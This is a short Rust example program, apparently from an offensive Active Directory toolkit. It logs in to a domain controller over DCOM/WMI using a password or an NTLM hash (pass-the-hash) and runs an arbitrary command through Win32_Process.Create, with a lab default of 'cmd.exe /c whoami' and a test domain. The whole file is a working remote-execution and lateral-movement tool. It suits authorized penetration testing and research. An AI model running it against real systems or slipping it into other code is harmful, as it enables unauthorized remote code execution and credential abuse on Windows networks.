// Live Stage-1 WMI activation probe: RemoteCreateInstance of IWbemLevel1Login against a DC.
// HRESULT 0 = the SCM accepted the activation blob (E_FAIL 0x80004005 = still refused).
//   P=... U=administrator D=TESTLAB DC=10.10.10.22 cargo run --example wmi_probe
use std::env;

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let host = env::var("DC").unwrap_or_else(|_| "10.10.10.22".into());
    let domain = env::var("D").unwrap_or_else(|_| "TESTLAB".into());
    let user = env::var("U").unwrap_or_else(|_| "administrator".into());
    let pass = env::var("P").unwrap_or_default();
    let clsid = "8bc3f05e-d86b-11d0-a075-00c04fb68820"; // CLSID_WbemLevel1Login
    let iid = "f309ad18-d86a-11d0-a075-00c04fb68820"; // IID_IWbemLevel1Login

    let _ = (clsid, iid);
    let command =
        env::var("CMD").unwrap_or_else(|_| "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt".into());
    if env::var("DUMP").is_ok() {
        let stub = dcerpc::dcom_wmi::exec_method_stub_dump(&command);
        println!(
            "{}",
            stub.iter().map(|b| format!("{b:02x}")).collect::<String>()
        );
        return Ok(());
    }
    // HASH=<32 hex> for pass-the-hash instead of P=<password>.
    let hash = env::var("HASH").ok().and_then(|h| {
        let b = (0..16)
            .map(|i| u8::from_str_radix(&h[i * 2..i * 2 + 2], 16))
            .collect::<Result<Vec<_>, _>>()
            .ok()?;
        b.try_into().ok()
    });
    let hr = dcerpc::dcom_wmi::wmi_exec(
        &host,
        &domain,
        &user,
        &pass,
        hash.as_ref(),
        "ADHAMMER",
        &command,
    )
    .await?;
    println!("[+] Win32_Process.Create HRESULT=0x{:08x}", hr as u32);
    if hr == 0 {
        println!("[+] PROCESS CREATED via WMI: {command}");
    } else {
        println!("[-] ExecMethod returned 0x{:08x}", hr as u32);
    }
    Ok(())
}
